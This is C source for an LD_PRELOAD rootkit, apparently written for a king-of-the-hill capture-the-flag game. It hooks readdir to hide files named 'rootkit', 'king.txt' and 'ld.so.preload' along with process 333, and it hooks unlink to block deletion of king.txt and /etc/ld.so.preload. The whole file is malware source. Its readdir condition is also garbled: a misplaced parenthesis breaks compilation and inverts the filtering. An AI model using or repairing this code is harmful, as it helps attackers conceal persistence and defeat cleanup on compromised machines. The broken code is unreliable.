#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h> // Include this header for O_RDONLY

static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
static int (*orig_unlink)(const char *pathname) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide files/directories containing "rootkit" or "king.txt" or "ld.so.preload"
        if (strstr(entry->d_name, "rootkit") == NULL && strstr(entry->d_name, "king.txt" && strstr(entry->d_name, "ld.so.preload") == NULL) {
            // Hide process with a specific PID (e.g., 333)
            if (strcmp(entry->d_name, "333") == 0) {
                continue;
            }
            return entry;
        }
    }
    return NULL;
}

int unlink(const char *pathname) {
    if (!orig_unlink) {
        orig_unlink = dlsym(RTLD_NEXT, "unlink");
    }

    // Protect "king.txt" from being deleted
    if (strstr(pathname, "king.txt") != NULL) {
        errno = EACCES;
        return -1;
    }
    // Protect "/etc/ld.so.preload" from being deleted
    if (strstr(pathname, "ld.so.preload") != NULL) {
        errno = EACCES;
        return -1;
    }
    return orig_unlink(pathname);
}
